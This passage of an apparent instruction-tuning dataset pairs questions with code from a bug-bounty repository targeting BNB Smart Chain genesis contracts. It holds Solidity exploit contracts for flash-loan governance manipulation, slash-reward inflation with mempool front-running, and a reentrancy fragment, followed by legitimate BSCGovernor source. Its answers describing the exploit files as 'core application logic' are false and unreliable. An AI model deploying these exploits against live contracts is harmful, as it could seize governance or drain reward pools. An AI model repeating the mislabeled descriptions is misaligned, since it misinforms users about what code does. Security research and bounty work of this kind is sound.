redelegate(\n        address srcValidator,\n        address dstValidator,\n        uint256 shares,\n        bool delegateVotePower\n    ) external;\n\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n}\n\ninterface IStakeCredit {\n    function delegate(address delegator) external payable returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title MaliciousCreditContract\n * @dev Simulates a malicious StakeCredit contract that attempts reentrancy\n */\ncontract MaliciousCreditContract {\n    IStakeHub public stakeHub;\n    address public targetValidator;\n    uint256 public attackCount;\n    uint256 public maxAttacks;\n    bool public attacking;\n\n    event ReentrancyAttempt(uint256 count, uint256 value);\n    \n```", "output": "This file `ReentrancyExploit.sol` is part of the 01_StakeHub_Reentrancy project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for FlashLoanGovernanceExploit.sol which is part of the 02_GovToken_FlashLoan project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\submissions\\02_GovToken_FlashLoan\\FlashLoanGovernanceExploit.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Flash Loan Governance Manipulation                           â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - GovToken + StakeHub                    â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $75,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The GovToken mints voting power based on staked BNB amount.\n * If an attacker can:\n * 1. Flash loan large amount of BNB\n * 2. Delegate to validator (get shares)\n * 3. Sync GovToken (get voting power)\n * 4. Vote on governance proposal\n * 5. Undelegate and repay flash loan\n *\n * The 7-day unbond period SHOULD prevent this, but we need to verify\n * there's no bypass via redelegate() or other mechanisms.\n *\n * WHY IT'S DANGEROUS:\n * - Could pass malicious governance proposals\n * - Drain treasury funds\n * - Modify critical protocol parameters\n * - Change system contract addresses\n */\n\ninterface IStakeHub {\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n    function redelegate(address src, address dst, uint256 shares, bool power) external;\n    function syncGovToken(address[] calldata operators, address account) external;\n}\n\ninterface IGovToken {\n    function balanceOf(address account) external view returns (uint256);\n    function getVotes(address account) external view returns (uint256);\n    function delegates(address account) external view returns (address);\n}\n\ninterface IBSCGovernor {\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n\n    function castVote(uint256 proposalId, uint8 support) external returns (uint256);\n    function proposalThreshold() external view returns (uint256);\n}\n\ninterface IFlashLoanProvider {\n    function flashLoan(address recipient, uint256 amount, bytes calldata data) external;\n}\n\n/**\n * @title FlashLoanGovernanceExploit\n * @dev Attempts to manipulate governance via flash loan\n */\ncontract FlashLoanGovernanceExploit {\n    IStakeHub public stakeHub;\n    IGovToken public govToken;\n    IBSCGovernor public governor;\n\n    address public targetValidator;\n    uint256 public proposalId;\n    bool public inFlashLoan;\n\n    event FlashLoanReceived(uint256 amount);\n    event VotingPowerAcquired(uint256 votes);\n    event ProposalCreated(uint256 proposalId);\n    event VoteCast(uint256 proposalId, uint256 weight);\n    event ExploitResult(bool success, string message);\n\n    constructor(\n        address _stakeHub,\n        address _govToken,\n        address _governor\n    ) {\n        stakeHub = IStakeHub(_stakeHub);\n        govToken = IGovToken(_govToken);\n        governor = IBSCGovernor(_governor);\n    }\n\n    /**\n     * @dev Main exploit entry point\n     * @param _targetValidator Validator to delegate to\n     * @param _proposalId Existing proposal to vote on (or 0 to create new)\n     * @param flashLoanAmount Amount to flash loan\n     */\n    function executeExploit(\n        address _targetValidator,\n        uint256 _proposalId,\n        uint256 flashLoanAmount\n    ) external payable {\n        targetValidator = _targetValidator;\n        proposalId = _proposalId;\n        inFlashLoan = true;\n\n        // Simulate flash loan callback\n        // In production, this would be called by the flash loan provider\n        _onFlashLoan(flashLoanAmount);\n    }\n\n    /**\n     * @dev Flash loan callback - this is where the attack happens\n     */\n    function _onFlashLoan(uint256 amount) internal {\n        emit FlashLoanReceived(amount);\n\n        // Step 1: Delegate to validator with flash loaned funds\n        stakeHub.delegate{value: amount}(targetValidator, true);\n\n        // Step 2: Sync GovToken to get voting power\n        address[] memory validators = new address[](1);\n        validators[0] = targetValidator;\n        stakeHub.syncGovToken(validators, address(this));\n\n        uint256 votes = govToken.getVotes(address(this));\n        emit VotingPowerAcquired(votes);\n\n        // Step 3: Create or vote on proposal\n        if (proposalId == 0) {\n            // Create malicious proposal\n            address[] memory targets = new address[](1);\n            uint256[] memory values = new uint256[](1);\n            bytes[] memory calldatas = new bytes[](1);\n\n            targets[0] = address(stakeHub);\n            values[0] = 0;\n            // Example: try to change a critical parameter\n            calldatas[0] = abi.encodeWithSignature(\n                \"updateParam(string,bytes)\",\n                \"maxElectedValidators\",\n                abi.encode(uint256(1)) // Reduce to 1 validator = centralization\n            );\n\n            try governor.propose(targets, values, calldatas, \"Malicious Proposal\") returns (uint256 id) {\n                proposalId = id;\n                emit ProposalCreated(id);\n            } catch {\n                emit ExploitResult(false, \"Proposal creation failed\");\n            }\n        }\n\n        // Step 4: Cast vote\n        if (proposalId != 0) {\n            try governor.castVote(proposalId, 1) returns (uint256 weight) {\n                emit VoteCast(proposalId, weight);\n            } catch {\n                emit ExploitResult(false, \"Vote casting failed\");\n            }\n        }\n\n        // Step 5: Attempt immediate undelegate\n        // This SHOULD fail due to unbond period, but let's verify\n        uint256 shares = govToken.balanceOf(address(this));\n        try stakeHub.undelegate(targetValidator, shares) {\n            emit ExploitResult(true, \"CRITICAL: Immediate undelegate succeeded!\");\n        } catch Error(string memory reason) {\n            emit ExploitResult(false, string.concat(\"Undelegate blocked: \", reason));\n        }\n\n        // Step 6: Try redelegate as bypass\n        // Check if redelegate allows immediate withdrawal\n        try stakeHub.redelegate(targetValidator, targetValidator, shares, false) {\n            emit ExploitResult(true, \"WARNING: Redelegate might be a bypass vector\");\n        } catch {\n            emit ExploitResult(false, \"Redelegate also blocked\");\n        }\n\n        inFlashLoan = false;\n    }\n\n    /**\n     * @dev Analyze if the attack is viable\n     */\n    function analyzeViability() external view returns (\n        uint256 proposalThreshold,\n        uint256 currentVotes,\n        bool hasEnoughVotes\n    ) {\n        proposalThreshold = governor.proposalThreshold();\n        currentVotes = govToken.getVotes(address(this));\n        hasEnoughVotes = currentVotes >= proposalThreshold;\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title FlashLoanSimulator\n * @dev Simulates a flash loan for testing purposes\n */\ncontract FlashLoanSimulator {\n    FlashLoanGovernanceExploit public exploit;\n\n    constructor(address _exploit) {\n        exploit = FlashLoanGovernanceExploit(payable(_exploit));\n    }\n\n    function simulateFlashLoan(\n        address targetValidator,\n        uint256 proposalId,\n        uint256 amount\n    ) external payable {\n        require(msg.value >= amount, \"Insufficient funds for simulation\");\n\n        // Send funds to exploit contract and execute\n        exploit.executeExploit{value: amount}(\n            targetValidator,\n            proposalId,\n            amount\n        );\n\n        // In real flash loan, funds would need to be returned here\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file FlashLoanGovernanceExploit.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Flash Loan Governance Manipulation                           â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - GovToken + StakeHub                    â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $75,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The GovToken mints voting power based on staked BNB amount.\n * If an attacker can:\n * 1. Flash loan large amount of BNB\n * 2. Delegate to validator (get shares)\n * 3. Sync GovToken (get voting power)\n * 4. Vote on governance proposal\n * 5. Undelegate and repay flash loan\n *\n * The 7-day unbond period SHOULD prevent this, but we need to verify\n * there's no bypass via redelegate() or other mechanisms.\n *\n * WHY IT'S DANGEROUS:\n * - Could pass malicious governance proposals\n * - Drain treasury funds\n * - Modify critical protocol parameters\n * - Change system contract addresses\n */\n\ninterface IStakeHub {\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n    function redelegate(address src, address dst, uint256 shares, bool power) external;\n    function syncGovToken(address[] calldata operators, address account) external;\n}\n\ninterface IGovToken {\n    function balanceOf(address account) external view returns (uint256);\n    function getVotes(address account) external view returns (uint256);\n    function delegates(address account) external view returns (address);\n}\n\ninterface IBSCGovernor {\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n\n    function castVote(uint256 proposalId, uint8 support) externa\n```", "output": "This file `FlashLoanGovernanceExploit.sol` is part of the 02_GovToken_FlashLoan project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SlashRewardManipulation.sol which is part of the 03_Slash_Reward_Manipulation project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\submissions\\03_Slash_Reward_Manipulation\\SlashRewardManipulation.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Slash Reward Inflation Attack                                â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - SlashIndicator                         â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $25,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In SlashIndicator.sol line 260:\n *   uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n *\n * The reward is calculated as a percentage of SYSTEM_REWARD_ADDR balance.\n * An attacker can:\n * 1. Send large amount of BNB to SYSTEM_REWARD_ADDR\n * 2. Submit valid finality violation evidence\n * 3. Receive inflated reward (20% of the inflated balance)\n * 4. Profit = 20% of donated amount\n *\n * WHY IT'S DANGEROUS:\n * - Drains system reward pool\n * - Creates economic incentive for fake slashing\n * - Could be combined with validator collusion\n */\n\ninterface ISlashIndicator {\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    function submitFinalityViolationEvidence(FinalityEvidence memory evidence) external;\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title SlashRewardManipulator\n * @dev Exploits the slash reward calculation vulnerability\n */\ncontract SlashRewardManipulator {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant SLASH_INDICATOR_ADDR = 0x0000000000000000000000000000000000001001;\n\n    uint256 public constant FELONY_SLASH_REWARD_RATIO = 20; // 20%\n\n    event BalanceInflated(uint256 originalBalance, uint256 inflatedBalance);\n    event RewardCalculation(uint256 expectedReward, uint256 donatedAmount, int256 profit);\n    event ExploitAttempted(bool success, uint256 reward);\n\n    /**\n     * @dev Calculate potential profit from the attack\n     * @param donationAmount Amount to donate to SYSTEM_REWARD_ADDR\n     * @return expectedReward The reward attacker would receive\n     * @return profit Net profit (can be negative if gas > reward)\n     */\n    function calculateProfit(uint256 donationAmount) external view returns (\n        uint256 expectedReward,\n        int256 profit\n    ) {\n        uint256 currentBalance = SYSTEM_REWARD_ADDR.balance;\n        uint256 inflatedBalance = currentBalance + donationAmount;\n\n        expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;\n\n        // Profit = reward - donation\n        // Note: This is profitable only if attacker has valid evidence\n        profit = int256(expectedReward) - int256(donationAmount);\n    }\n\n    /**\n     * @dev Simulate the attack flow\n     * @param donationAmount Amount to donate for inflation\n     * @param hasValidEvidence Whether attacker has valid slashing evidence\n     */\n    function simulateAttack(\n        uint256 donationAmount,\n        bool hasValidEvidence\n    ) external payable returns (bool profitable) {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        uint256 originalBalance = SYSTEM_REWARD_ADDR.balance;\n\n        // Step 1: Inflate SYSTEM_REWARD balance\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, \"Donation failed\");\n\n        uint256 inflatedBalance = SYSTEM_REWARD_ADDR.balance;\n        emit BalanceInflated(originalBalance, inflatedBalance);\n\n        // Step 2: Calculate expected reward\n        uint256 expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;\n        int256 profit = int256(expectedReward) - int256(donationAmount);\n\n        emit RewardCalculation(expectedReward, donationAmount, profit);\n\n        // Step 3: The attack is only profitable if:\n        // - Attacker has valid evidence AND\n        // - expectedReward > donationAmount (which is always false with 20%)\n        //\n        // HOWEVER, if combined with legitimate slashing:\n        // - Original balance reward is \"free\"\n        // - Attacker only loses 80% of donation\n        // - But gains 20% of original balance\n        //\n        // Profitable scenario:\n        // - Original balance = 1000 BNB\n        // - Normal reward = 200 BNB\n        // - Attacker donates 100 BNB\n        // - New reward = (1100 * 20%) = 220 BNB\n        // - Extra profit = 20 BNB (but lost 100 BNB donation)\n        // - Net = -80 BNB (NOT PROFITABLE alone)\n        //\n        // BUT if attacker would slash anyway:\n        // - Gets 220 instead of 200 = +20 BNB extra\n        // - Cost = 100 BNB donation\n        // - Net = -80 BNB (still not profitable)\n\n        profitable = profit > 0;\n\n        // Note: The real vulnerability is if an attacker can front-run\n        // a legitimate slashing report by:\n        // 1. Detecting a pending slash tx in mempool\n        // 2. Donating to inflate balance\n        // 3. Their donation gets included first\n        // 4. Original slasher gets inflated reward\n        // 5. Attacker doesn't benefit directly but could:\n        //    - Be the validator being slashed (reduce their loss)\n        //    - Collude with the slasher for kickback\n\n        emit ExploitAttempted(hasValidEvidence, hasValidEvidence ? expectedReward : 0);\n\n        return profitable;\n    }\n\n    /**\n     * @dev Execute actual attack (requires valid evidence)\n     * Note: This is for educational purposes - real evidence would be needed\n     */\n    function executeAttack(\n        uint256 donationAmount,\n        bytes memory header1,\n        bytes memory header2\n    ) external payable {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        uint256 balanceBefore = address(this).balance;\n\n        // Step 1: Inflate balance\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, \"Donation failed\");\n\n        // Step 2: Submit evidence (would need real double-sign evidence)\n        try ISlashIndicator(SLASH_INDICATOR_ADDR).submitDoubleSignEvidence(header1, header2) {\n            uint256 balanceAfter = address(this).balance;\n            uint256 reward = balanceAfter - balanceBefore + donationAmount;\n            emit ExploitAttempted(true, reward);\n        } catch {\n            emit ExploitAttempted(false, 0);\n        }\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title SlashFrontRunner\n * @dev Front-runs slash transactions to manipulate rewards\n */\ncontract SlashFrontRunner {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n\n    event FrontRunDetected(bytes32 txHash, address slasher);\n    event FrontRunExecuted(uint256 donationAmount);\n\n    /**\n     * @dev Called when a slash transaction is detected in mempool\n     * In practice, this would be triggered by a mempool monitoring bot\n     */\n    function frontRunSlash(uint256 donationAmount) external payable {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        // Donate to inflate balance before the slash tx executes\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, \"Donation failed\");\n\n        emit FrontRunExecuted(donationAmount);\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file SlashRewardManipulation.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Slash Reward Inflation Attack                                â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - SlashIndicator                         â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $25,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In SlashIndicator.sol line 260:\n *   uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n *\n * The reward is calculated as a percentage of SYSTEM_REWARD_ADDR balance.\n * An attacker can:\n * 1. Send large amount of BNB to SYSTEM_REWARD_ADDR\n * 2. Submit valid finality violation evidence\n * 3. Receive inflated reward (20% of the inflated balance)\n * 4. Profit = 20% of donated amount\n *\n * WHY IT'S DANGEROUS:\n * - Drains system reward pool\n * - Creates economic incentive for fake slashing\n * - Could be combined with validator collusion\n */\n\ninterface ISlashIndicator {\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    function submitFinalityViolationEvidence(FinalityEvidence memory evidence) external;\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title SlashRewardManipulator\n * @dev Exploits the slash reward calculation vulnerability\n */\ncontract SlashRewardManipulator {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant SLASH_INDICATOR_ADDR = 0x000000000000000000000000000000000\n```", "output": "This file `SlashRewardManipulation.sol` is part of the 03_Slash_Reward_Manipulation project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BSCGovernor.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\BSCGovernor.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorSettingsUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/GovernorUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/compatibility/GovernorCompatibilityBravoUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorVotesUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorTimelockControlUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorVotesQuorumFractionUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorPreventLateQuorumUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./extension/Protectable.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\nimport \"./interface/0.8.x/IGovToken.sol\";\n\ncontract BSCGovernor is\n    SystemV2,\n    Initializable,\n    Protectable,\n    GovernorUpgradeable,\n    GovernorSettingsUpgradeable,\n    GovernorCompatibilityBravoUpgradeable,\n    GovernorVotesUpgradeable,\n    GovernorTimelockControlUpgradeable,\n    GovernorVotesQuorumFractionUpgradeable,\n    GovernorPreventLateQuorumUpgradeable\n{\n    using Utils for bytes;\n    using Utils for string;\n\n    /*----------------- constants -----------------*/\n    /**\n     * @dev caution:\n     * INIT_VOTING_DELAY, INIT_VOTING_PERIOD and INIT_MIN_PERIOD_AFTER_QUORUM are default in number of blocks, not seconds\n     */\n    uint256 private constant BLOCK_INTERVAL = 3 seconds; // TODO(Nathan): Only can be used to do initialize!\n    uint256 private constant INIT_VOTING_DELAY = 0 hours / BLOCK_INTERVAL;\n    uint256 private constant INIT_VOTING_PERIOD = 7 days / BLOCK_INTERVAL;\n    uint256 private constant INIT_PROPOSAL_THRESHOLD = 200 ether; //  = 200 BNB\n    uint256 private constant INIT_QUORUM_NUMERATOR = 10; // for >= 10%\n\n    // starting propose requires totalSupply of GovBNB >= 10000000 * 1e18\n    uint256 private constant PROPOSE_START_GOVBNB_SUPPLY_THRESHOLD = 10_000_000 ether;\n    // ensures there is a minimum voting period (1 days) after quorum is reached\n    uint64 private constant INIT_MIN_PERIOD_AFTER_QUORUM = uint64(1 days / BLOCK_INTERVAL);\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x584a7938\n    error NotWhitelisted();\n    // @notice signature: 0x11b6707f\n    error TotalSupplyNotEnough();\n    // @notice signature: 0x867f3ee5\n    error OneLiveProposalPerProposer();\n\n    /*----------------- storage -----------------*/\n    // target contract => is whitelisted for governance\n    mapping(address => bool) public whitelistTargets;\n\n    bool public proposeStarted;\n\n    // @notice The latest proposal for each proposer\n    mapping(address => uint256) public latestProposalIds;\n\n    /*----------------- init -----------------*/\n    function initialize() external initializer onlyCoinbase onlyZeroGasPrice {\n        __Governor_init(\"BSCGovernor\");\n        __GovernorSettings_init(INIT_VOTING_DELAY, INIT_VOTING_PERIOD, INIT_PROPOSAL_THRESHOLD);\n        __GovernorCompatibilityBravo_init();\n        __GovernorVotes_init(IVotesUpgradeable(GOV_TOKEN_ADDR));\n        __GovernorTimelockControl_init(TimelockControllerUpgradeable(payable(TIMELOCK_ADDR)));\n        __GovernorVotesQuorumFraction_init(INIT_QUORUM_NUMERATOR);\n        __GovernorPreventLateQuorum_init(INIT_MIN_PERIOD_AFTER_QUORUM);\n\n        // BSCGovernor => Timelock => GovHub => system contracts\n        whitelistTargets[GOV_HUB_ADDR] = true;\n\n        // Different address will be set depending on the environment\n        __Protectable_init_unchained(0x08E68Ec70FA3b629784fDB28887e206ce8561E08);\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @dev Create a new proposal. Vote start after a delay specified by {IGovernor-votingDelay} and lasts for a\n     * duration specified by {IGovernor-votingPeriod}.\n     *\n     * Emits a {ProposalCreated} event.\n     */\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    )\n        public\n        override(GovernorUpgradeable, GovernorCompatibilityBravoUpgradeable, IGovernorUpgradeable)\n        whenNotPaused\n        notInBlackList\n        returns (uint256)\n    {\n        _checkAndStartPropose();\n\n        uint256 latestProposalId = latestProposalIds[msg.sender];\n        if (latestProposalId != 0) {\n            ProposalState proposersLatestProposalState = state(latestProposalId);\n            if (\n                proposersLatestProposalState == ProposalState.Active\n                    || proposersLatestProposalState == ProposalState.Pending\n            ) {\n                revert OneLiveProposalPerProposer();\n            }\n        }\n\n        bytes32 descriptionHash = keccak256(bytes(description));\n        uint256 proposalId = hashProposal(targets, values, calldatas, descriptionHash);\n        latestProposalIds[msg.sender] = proposalId;\n\n        return GovernorCompatibilityBravoUpgradeable.propose(targets, values, calldatas, description);\n    }\n\n    /**\n     * @dev Function to queue a proposal to the timelock.\n     * @param targets target contracts to call\n     * @param values msg.value for each contract call\n     * @param calldatas calldata for each contract call\n     * @param descriptionHash the description hash\n     */\n    function queue(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    )\n        public\n        override(GovernorTimelockControlUpgradeable, IGovernorTimelockUpgradeable)\n        whenNotPaused\n        notInBlackList\n        returns (uint256 proposalId)\n    {\n        for (uint256 i = 0; i < targets.length; i++) {\n            if (!whitelistTargets[targets[i]]) revert NotWhitelisted();\n        }\n\n        return GovernorTimelockControlUpgradeable.queue(targets, values, calldatas, descriptionHash);\n    }\n\n    /**\n     * @dev Cancel a proposal. A proposal is cancellable by the proposer, but only while it is Pending state, i.e.\n     * before the vote starts.\n     *\n     * Emits a {ProposalCanceled} event.\n     */\n    function cancel(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    )\n        public\n        override(GovernorUpgradeable, GovernorCompatibilityBravoUpgradeable, IGovernorUpgradeable)\n        returns (uint256)\n    {\n        return GovernorCompatibilityBravoUpgradeable.cancel(targets, values, calldatas, descriptionHash);\n    }\n\n    /*----------------- system functions -----------------*/\n    /**\n     * @param key the key of the param\n     * @param value the value of the param\n     */\n    function updateParam(string calldata key, bytes calldata value) external onlyGov {\n        if (key.compareStrings(\"votingDelay\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newVotingDelay = value.bytesToUint256(32);\n            if (newVotingDelay == 0 || newVotingDelay > 24 hours) revert InvalidValue(key, value);\n            _setVotingDelay(newVotingDelay);\n        } else if (key.compareStrings(\"votingPeriod\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newVotingPeriod = value.bytesToUint256(32);\n            if (newVotingPeriod == 0 || newVotingPeriod > 30 days) revert InvalidValue(key, value);\n            _setVotingPeriod(newVotingPeriod);\n        } else if (key.compareStrings(\"proposalThreshold\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newProposalThreshold = value.bytesToUint256(32);\n            if (newProposalThreshold == 0 || newProposalThreshold > 10_000 ether) revert InvalidValue(key, value);\n            _setProposalThreshold(newProposalThreshold);\n        } else if (key.compareStrings(\"quorumNumerator\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newQuorumNumerator = value.bytesToUint256(32);\n            if (newQuorumNumerator < 5 || newQuorumNumerator > 20) revert InvalidValue(key, value);\n            _updateQuorumNumerator(newQuorumNumerator);\n        } else if (key.compareStrings(\"minPeriodAfterQuorum\")) {\n            if (value.length != 8) revert InvalidValue(key, value);\n            uint64 newMinPeriodAfterQuorum = value.bytesToUint64(8);\n            if (newMinPeriodAfterQuorum == 0 || newMinPeriodAfterQuorum > 2 days) revert InvalidValue(key, value);\n            _setLateQuorumVoteExtension(newMinPeriodAfterQuorum);\n        } else if (key.compareStrings(\"governorProtector\")) {\n            if (value.length != 20) revert InvalidValue(key, value);\n            address newGovernorProtector = value.bytesToAddress(20);\n            if (newGovernorProtector == address(0)) revert InvalidValue(key, value);\n            _setProtector(newGovernorProtector);\n        } else {\n            revert UnknownParam(key, value);\n        }\n        emit ParamChange(key, value);\n    }\n\n    /*----------------- view functions -----------------*/\n    /*\n     *@notice Query if a contract implements an interface\n     *@param interfaceID The interface identifier, as specified in ERC-165\n     *@dev Interface identification is specified in ERC-165. This function\n     *uses less than 30,000 gas.\n     *@return `true` if the contract implements `interfaceID` and\n     *`interfaceID` is not 0xffffffff, `false` otherwise\n     */\n    function supportsInterface(\n        bytes4 interfaceId\n    )\n        public\n        view\n        override(GovernorUpgradeable, IERC165Upgradeable, GovernorTimelockControlUpgradeable)\n        returns (bool)\n    {\n        return GovernorTimelockControlUpgradeable.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @notice module:core\n     * @dev Current state of a proposal, following Compound's convention\n     */\n    function state(\n        uint256 proposalId\n    )\n        public\n        view\n        override(GovernorUpgradeable, IGovernorUpgradeable, GovernorTimelockControlUpgradeable)\n        returns (ProposalState)\n    {\n        return GovernorTimelockControlUpgradeable.state(proposalId);\n    }\n\n    /**\n     * @dev Part of the Governor Bravo's interface: _\"The number of votes required in order for a voter to become a proposer\"_.\n     */\n    function proposalThreshold()\n        public\n        view\n        override(GovernorSettingsUpgradeable, GovernorUpgradeable)\n        returns (uint256)\n    {\n        return GovernorSettingsUpgradeable.proposalThreshold();\n    }\n\n    /**\n     * 